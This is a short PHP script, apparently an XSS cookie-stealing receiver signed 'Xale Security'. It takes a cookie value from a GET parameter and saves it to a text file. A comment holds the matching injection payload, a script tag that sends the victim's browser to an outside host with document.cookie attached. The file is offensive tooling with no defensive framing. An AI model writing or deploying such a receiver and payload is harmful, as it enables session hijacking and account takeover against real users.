<?php
session_start();
$a = $_GET['cookie'];
#<script>window.location="http://.com/i.php?cookie="+document.cookie</script>
$file = fopen("cok.txt", "w");
echo fwrite($file, $a);
fclose($file);

# Xale Security

?>
